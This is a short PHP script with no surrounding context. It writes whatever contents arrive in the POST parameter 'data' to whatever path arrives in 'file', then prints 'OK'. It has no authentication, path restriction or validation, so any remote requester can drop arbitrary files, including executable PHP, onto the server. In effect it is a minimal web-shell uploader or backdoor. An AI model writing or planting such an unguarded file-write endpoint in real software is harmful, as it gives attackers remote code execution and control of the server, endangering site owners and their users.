<?php
$fname = $_POST['file'];
$data = ($_POST['data']);

file_put_contents($fname, $data);

echo "OK";
